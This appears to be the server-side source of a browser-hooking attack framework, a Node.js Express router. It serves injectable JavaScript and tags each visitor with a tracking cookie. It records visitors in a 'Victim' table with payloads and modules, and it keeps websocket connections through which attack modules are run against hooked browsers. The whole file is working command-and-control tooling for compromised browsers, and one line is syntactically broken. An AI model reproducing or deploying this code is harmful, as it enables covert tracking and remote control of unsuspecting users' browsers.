var express = require('express'),
    router = express.Router(),
    auws = {};

router.all('/', function(req, res){
    res.header('Content-Type', 'application/javascript');
    return res.render('index', {
        protocol:config.ssl?'https:':'',
        host:config.host||req.header('host'),
        id:req.query.i||'1'
    });
});

router.all('/i/', function(req, res){
    //  XXX who id use "Canvas Fingerprinting"
    var id = req.param('i');
    var who = req.cookies.who;
    sql.Victim.findOne({who:who}, function(err, info){
        if(info)return res.jsonp(info.load);
        sql.Item.findById(id, function(err, info){
            if(!info)return res.jsonp({err:404});
            var group = info.group||req.header('referer')||'Default';
            who = sql.hash(group+id+Math.random());
            res.cookie('who', who);
            sql.Victim.create({
                group:group,
                who:who,
                name:info.name+'_'+Date.now(),
                payload:info.payload,
                modules:info.modules,
                status:{},
                now:Date.now()
            });
            return res.jsonp(info.load);
        });
    });
});

function online(who, on){
    sql.Victim.findOne({who:who}, function(err, info){
        info&&sql.Victim.update({who:who}, {
            now:on
        });
    });
};
function handle(req, res, modules, auws, victim, who, msg){
    var share = {};
    var path = fs.realpathSync('.');
    for(var i in modules){
        if(typeof share[modules[i][0]] != 'object'){
            share[modules[i][0]] = [];
        };
        try{
            if(!fs.lstatSync(path+'/'+modules[i][0]).isDirectory())throw 'path error.';
            var m = require(path+'/modules/'+modules[i][0]+'/'+modules[i][0]);
        }catch(err){
            share[modules[i][0]].unshift({'err':err});
            continue
        };
        share[modules[i][0]].unshift(
            m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:auws, g:msg})
        );
    };
};

var http = function(req, res){
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(!info||(!who&&!req.session.user))return err404(req, res);
        !req.session.user&&online(who, Date.now());
        handle(req, res, info.modules, null, sql.Victim, who, null);
    });
};
router.all('/e/:uri', http);
router.all('/home/page/:uri', http);

exports.ws = function(ws, req){
    var pageid = req.params.uri;
    var who = req.cookies.who;
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(!info||(!who&&!req.session.user))return null;
        var owner = req.session.user:true?false;
        who = req.session.user?null:who;
        ws.on('open', function(){
            auws[who] = ws;
            return !owner&&online(who, 'online');
        });
        ws.on('close', function(){
            delete auws[who];
            return !owner&&online(who, Date.now());
        });
        ws.on('message', function(msg){
            handle(req, ws, info.modules, auws, sql.Victim, who, msg);
        });
    });
};

exports.router = router;
